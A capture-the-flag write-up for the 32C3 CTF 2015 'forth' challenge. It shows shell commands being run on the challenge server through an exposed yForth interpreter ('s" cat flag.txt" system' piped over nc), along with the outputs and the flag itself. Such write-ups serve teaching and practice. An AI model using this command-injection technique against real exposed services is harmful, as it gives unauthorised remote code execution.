# 32C3 CTF 2015 : forth

**Category:** Pwn
**Points:** 150
**Solves:** 372
**Description:**

> Connect to 136.243.194.49:1024 and get a shell.


## Write-up

by [polym](https://github.com/abpolym)

Connecting to the services with `nc` yields some important information about what type of service we are dealing with:

```bash
$ nc 136.243.194.49 1024
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
s
[s] error(2): unknown word.
```

Seems like [`yForth`](https://packages.debian.org/wheezy/yforth) is an interpreter for the Forth language.

Our ultimate goal is to execute commands on the machine, so we search for `execute command forth` to find [a rosetta link](http://rosettacode.org/wiki/Execute_a_system_command#Forth) that explains and lists how to execute commands in different languages, including the Forth language:

	s" ls" system

Testing this yields in an output of `ls` on the 32c3 server:

```bash
echo 's" ls" system' | nc 136.243.194.49 1024
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
flag.txt  README.gpl  run.sh  yforth
ok
```

We just have to read the flag:

```bash
$ echo 's" cat flag.txt" system' | nc 136.243.194.49 1024 | tail -n+5
32C3_a8cfc6174adcb39b8d6dc361e888f17b
ok
```

PS: We can also read the contents of `README.gpl` and `run.sh` to see how the challenge is executed to test it locally:

```bash
$ echo 's" cat run.sh" system' | nc 136.243.194.49 1024 | tail -n+5
#!/bin/sh
exec socat TCP-LISTEN:1024,fork,reuseaddr EXEC:./yforth,echo=0,pty,stderr
ok
```

## Other write-ups and resources

* <https://github.com/TactiFail/CTF-Writeups/blob/master/2015/32C3/pwn/forth.md>
* <http://securityerror.github.io/blog/12292015/forth.html>
* <https://nuc13us.wordpress.com/2015/12/30/32c3-ctf-writeup-forth-150/>
* <http://nopat.ch/2015/12/30/32c3ctf-pwn-forth/>
* <http://nandynarwhals.org/2015/12/30/32c3ctf-forth-pwn-150/>
* <https://github.com/p4-team/ctf/blob/master/2015-12-27-32c3/forth_pwn_150/README.md#eng-version>
* <https://www.youtube.com/watch?v=12el1zm99e4>
* [Execute a cmd with forth](http://rosettacode.org/wiki/Execute_a_system_command#Forth)
